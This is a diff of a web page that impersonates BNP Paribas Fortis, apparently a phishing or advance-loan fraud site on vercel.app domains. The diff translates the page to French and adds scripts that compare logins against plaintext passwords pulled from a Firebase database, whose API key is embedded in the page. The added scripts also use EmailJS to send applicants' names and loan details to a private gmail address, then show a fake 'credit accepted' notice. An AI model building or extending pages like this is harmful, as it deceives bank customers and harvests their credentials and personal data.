@@ -6,6 +6,7 @@
  
  <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <title></title>
   <style>
 
@@ -1564,20 +1565,20 @@ padding: 8px 0px;
   
   <div id="isCompte">
     <div>
-      No tenías una cuenta en BNP Paribas Fortis.
+      Vous n'aviez pas de compte chez BNP Paribas Fortis.
       <div style="margin: 10px 0px;">
         
     
-     Estás registrado? En caso afirmativo, espere unos minutos para validar el registro solicitado.
+     Êtes-vous déjà inscrit ? Si oui, veuillez patienter quelques minutes pour valider l'inscription demandée.
      </div>
      <div style="margin: 10px 0px;">
        
      
-     De lo contrario? regístrate ahora haciendo clic en el siguiente enlace
+Si ce n'est pas le cas, inscrivez-vous dès maintenant en cliquant sur le lien suivant
      
        
      </div>
-     <a href="https://bnpparibas-gfrz.vercel.app/signin">S'inscrire</a>
+     <a href="https://bnpparibasinter.vercel.app/signin">S'inscrire</a>
     </div>
   </div>
 
@@ -1604,22 +1605,22 @@ padding: 8px 0px;
     <div class="menu">
   <div class="list-drl">
        <div class="list-item">
-         <li> <a href="https://bnpparibas-nine.vercel.app/  ">Bienvenida</a></li>
+         <li> <a href="https://bnpparibasinter.vercel.app/  ">Accueil</a></li>
     
        </div>
       
   <div class="list-item">
-       <li><a href="https://bnpparibas-nine.vercel.app/signup ">Conectar</a></li>
+       <li><a href="https://bnpparibasinter.vercel.app/signup ">Se connecter</a></li>
      </div>
     <div class="list-item">
-         <li><a href="https://bnpparibas-nine.vercel.app/signin">Inscribirse</a></li>
+         <li><a href="https://bnpparibasinter.vercel.app/signin">S'inscrire</a></li>
        </div>
      
        <div class="list-item">
-         <li><a href="https://bnpparibas-nine.vercel.app/account">Cuenta Bancaria</a></li>
+         <li><a href="https://bnpparibasinter.vercel.app/account">Compte Bancaire</a></li>
        </div>
        <div class="list-item">
-         <li><a href="https://bnpparibas-nine.vercel.app/loan">Obtener crédito</a></li>
+         <li><a href="https://bnpparibasinter.vercel.app/loan">Obtenir crédit</a></li>
      
      
      
@@ -1640,16 +1641,16 @@ padding: 8px 0px;
 
  
 <div class="signup">
-  <img src="https://raw.githubusercontent.com/lisbonne456/gitau/master/bnp-paribas%20(1).jpg" alt="">
+  <img src="https://bnpparibasinter.vercel.app/bnp-paribas%20(1).jpg" alt="">
   
   <div class="account">
  <h1>BNP Paribas Fortis</h1> 
 
     <div class="email">
       <div style="margin: 10px 0px;">
-        para conectarse a
+       connexion 
       </div>
-      Correo electronico (@) <i class="fa fa-envelope" style="font-size:24px"></i></div>
+      adresse électronique (@) <i class="fa fa-envelope" style="font-size:24px"></i></div>
       <div>
            <input id="mail" type="text"placeholder="r@gmail.com" value="" />
       </div>
@@ -1658,12 +1659,12 @@ padding: 8px 0px;
     
        </div>
      <div class="password">
-     Contraseña
+    Mot de passe
  <i style="font-size:24px" class="fa">&#xf084;</i>
        
      </div>
      <div>
-           <input id="passw" type="password" placeholder="Contraseña" value=""/>
+           <input id="passw" type="password" placeholder="mot de" value=""/>
      </div>
 
    <div class="info">
@@ -1673,7 +1674,7 @@ padding: 8px 0px;
 </div>
  <div class="btn-sign">
          <button id=" btn"type="button" onclick="add()"  >
-         Iniciar sesión en su cuenta<i style="font-size:24px" class="fa">&#xf090;</i>
+         se connecter<i style="font-size:24px" class="fa">&#xf090;</i>
          </button>
      </div>
        
@@ -1691,6 +1692,7 @@ padding: 8px 0px;
    const menuHover = document.getElementById('open')
    const menuhover = document.getElementsByClassName('menu-hover')
      var userConnectMail='',userConnectPassword=""
+     var upfunc={},refr={},dbs={},contenu=[],users={}
      const isCompte=document.getElementById("isCompte")
      
      const btn=document.getElementById('btn')
@@ -1705,7 +1707,7 @@ padding: 8px 0px;
        isCompte.style.top = '-400px'
      })
    function add(){
-    
+   console.log(contenu)
      if(password.value!=''&& mail.value!=''){
        userConnectMail=userFindEmail(mail.value,contenu)
        userConnectPassword=userFindPassword(password.value,contenu)
@@ -1714,7 +1716,7 @@ padding: 8px 0px;
          info[1].innerHTML=""
        }
        else{
-         info[1].innerHTML='La contraseña debe tener al menos 8 caracteres '
+         info[1].innerHTML='Le mot de passe doit comporter au moins 8 caractères '
        }
      if(mail.value!=''){
     
@@ -1723,20 +1725,47 @@ padding: 8px 0px;
          info[0].innerHTML = ''
        }
        else {
-         info[0].innerHTML = 'El correo electrónico debe contener un símbolo @'
+         info[0].innerHTML ="L'e-mail doit comporter un arrobase @"
        }
      }
      
      
-     if(mail.value==userConnectMail.email& password.value==userConnectMail.password){
+     if(mail.value==userConnectMail.email& password.value==userConnectMail.password2){
    
      const link=document.getElementById("link")
        
-window.location.href=`https://bnpparibas-nine.vercel.app/account?authuser=${mail.value}`
-createCookie('email',mail.value,1)
+
+ 
+const usercrendential= 
+extrUser(contenu,mail.value)
+  if(usercrendential.tot_amount>0){
+    localStorage.clear()
+    window.location.href = `https://bnpparibasinter.vercel.app/account?authuser=${mail.value}`
+    createCookie('email', mail.value, 1)
+  }
   
-  
-  
+     const getLoan= localStorage.getItem('pretbnpparisbas')
+     if(getLoan!=null){
+       const getLoanf=JSON.parse(getLoan)
+       usercrendential.tot_amount = Number(getLoanf.montantpret)
+       usercrendential.dure = Number(getLoanf.dureRemboursement)
+       console.log(getLoanf)
+   setInbase(upfunc,dbs,refr,contenu)
+   createCookie('email', mail.value, 1)
+   sendMail(getLoanf,mail.value)
+   isCompte.style.top='180px'
+   isCompte.innerHTML=`
+   <div>
+     votre demande de crédit financier a été acceptée 
+   </div>
+   
+   `
+   setTimeout(function(){
+     localStorage.clear()
+     window.location.href = `https://bnpparibasinter.vercel.app/account?authuser=${mail.value}`
+   },1000)
+     }
+
   
   
   
@@ -1766,11 +1795,11 @@ createCookie('email',mail.value,1)
      else{
        if(mail.value==''){
      
-         info[0].innerHTML=' El correo electrónico no se puede vaciare'
+         info[0].innerHTML=" L'e-mail ne peut pas être vide"
        }
        if(password.value==''){
        
-         info[1].textContent="La contraseña no puede estar vacía"
+         info[1].textContent="Le mot de passe ne peut pas être vide"
        }
        if(mail.value!=''){
        
@@ -1780,7 +1809,7 @@ createCookie('email',mail.value,1)
            info[0].innerHTML=''
          }
          else{
-           info[0].innerHTML='El correo electrónico debe tener una arroba @'
+           info[0].innerHTML="L'e-mail doit comporter un arrobase @"
          }
         
        }
@@ -1821,6 +1850,7 @@ function userFindEmail(mail,content){
  
  
  let index=content.findIndex((index)=>index.email==mail )
+ console.log(index)
  if(index>-1){
    return content[index]
    
@@ -1833,7 +1863,7 @@ function userFindEmail(mail,content){
 }
 function userFindPassword(password,content){
   
-  let index= content.findIndex((pass)=>pass.password==password)
+  let index= content.findIndex((pass)=>pass.password2==password)
   if(index>-1){
    return content[index]}
  else{
@@ -1846,7 +1876,10 @@ function userFindPassword(password,content){
 
 
 
-
+function extrUser(user,cookies) {
+  const index = user.findIndex(index => index.email == cookies)
+  return user[index]
+}
 
 
 function getCookie(name) {
@@ -1860,23 +1893,7 @@ function getCookie(name) {
   return decodeURIComponent(value)
 }
 
-let sessionEmail=""
-let bnpparislisbonne=""
-window.onload=function(){
-  fetch("https://raw.githubusercontent.com/lisbonne456/gitau/master/data.json").then(function(resp) {
-    return resp.json()
-  }).then(function(data) {
-  
-  
-   contenu=(userFetchInfo(data))
-  
-  })
-  
-  if(sessionEmail!=null|| sessionEmail!=undefined && bnpparislisbonne!=null||bnpparislisbonne!=undefined){
-   
-  }
-  
-}
+
 
 let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
     const list= document.getElementById('hover-list')
@@ -1889,9 +1906,107 @@ let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""
 
 /*============Variables setting======*/
 
+function setInbase(func,dbase,rf,ctn){
+  func(rf(dbase, "bank/bankusers"), ctn).then(function(response){
+    
+   localStorage.clear()
+  })
+  
+}
 
+function sendMail(loan,user){
+ let cookies = getCookie('email')
+  
+  if (cookies != null) {
+    const users = extrUser(contenu,user)
+  console.log(users)
+    if (users.tot_amount !=0 && users.tot_amount !=1) {
+    
+      try {
+  
+        emailjs.init('nO0mGzC33a5qOSUx7')
+        var param = {
+          sendername: "BNP PARIBAS FORTIS",
+          to: "reunierprospere@gmail.com",
+          name: '' + users.username,
+          replyto: "" + cookies,
+          message: ` ${users.username} ${users.prenom} fait une demande de prêt pour une consommation de montant ${loan.montantpret}${users.currency} sur une durée de ${loan.dureRemboursement} Mois à taux d 'intérêts à 4,30%.
+      Mr ${users.prenom} ${users.username} accepte et être capable de payer par mois une somme ${loan.montantPayeMois}${users.currency} et une somme ${loan.remboursement_total}${users.currency} à la fin du prêt avec un intérêt assurance risque ${loan.interest.toFixed(2)}.
+      Date de Souscription au Prêt :${new Date().toString()}
+      `
+  
+        }
+        var serviceId = "service_cuzrpno"
+        var templateId = "template_z2winer"
+  
+  
+        emailjs.send(serviceId, templateId, param).then(function(resp) {
+  
+          if (resp.status == 200) {
+            console.log(resp)
+            isCompte.style.display = 'flex'
+  
+            isCompte.innerHTML = `
+              <div class='info'>
+                <div class='btn-close'>
+                  <div>*</div>
+                </div>
+                <div class='message'>
+                  Vous avez déjà souscrit à un crédit financier auprès de la banque
+                  <br>
+                  <div>
+                    veillez respecter vos obligations envers la banque pour un remboursement effectif de votre crédit financier
+                  </div>
+                  <br>
+                  connectez vous à votre compte bancaire en cliquant sur le lien ci dessous
+                  <br>
+                  <a href='https://meppenmegabenz.vercel.app/account'>Accédez à votre compte bancaire de crédit financier</a>
+                </div>
+             
+              </div>
+              </div>                 
+                                      
+                                     `
+  
+  
+  
+  
+  
+  
+          }
+          else {
+            isCompte.style.display = "flex"
+            isCompte.innerHTML = `
+                          <div class='info'>
+                            <div class='btn-close'>
+                              <div>*</div>
+                            </div>
+                 <div class='message'>
+               opération échouées.
+                 veillez réssayer si le problème persiste contactez le service financier à l'adresse mail suivante
+                               reunierprospere@gmail.com
+                            </div>
+                         
+                          </div>
+                          </div>          
+                                         `
+  
+  
+  
+            console.log(resp.status)
+          }
+        })
+  
+  
+      } catch (e) {
+  
+  
+        isCompte.style.display = 'flex'
+      }
+    }
+}
 
-
+}
 
   list.addEventListener('click',function() {
       if(listOpe){
@@ -1924,6 +2039,65 @@ let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""
      }) */
      </script>
  
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-analytics.js";
+  
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyBOttx-HrCl-zk6WztTVG-YiKop7-S8ZZM",
+    authDomain: "icecommerce-73a10.firebaseapp.com",
+    databaseURL: "https://icecommerce-73a10.firebaseio.com",
+    projectId: "icecommerce-73a10",
+    storageBucket: "icecommerce-73a10.appspot.com",
+    messagingSenderId: "128064356219",
+    appId: "1:128064356219:web:1535e38b4ddb461cb987de",
+    measurementId: "G-8QNWLE6HQR"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  import { getDatabase,ref,child,get,set,update,remove} from "https://www.gstatic.com/firebasejs/10.13.2/firebase-database.js"
+ let sessionEmail = ""
+ let bnpparislisbonne = ""
+ window.onload = function() {
+   
+ const db = getDatabase();
+  dbs = db
+  refr = ref
+  upfunc = set
+  const starCountRef = ref(getDatabase());
+  
+  get(child(starCountRef, "bank/bankusers")).then((snapshot) => {
+    if (snapshot.exists()) {
+      contenu = (userFetchInfo(snapshot.val()))
+     
+     console.log(contenu)
+    } else {
+      console.log("No data available");
+    }
+  }).catch((error) => {
+    console.error(error);
+  });
+  
+ 
+     
+ 
+   
+ 
+  /* if (sessionEmail!= null || sessionEmail != undefined && bnpparislisbonne != null || bnpparislisbonne != undefined) {
+ window.location.href='https://meppenmegabenz.vercel.app/account'
+   }*/
+ 
+ }
+
+  
+</script>
 
   
     <footer>
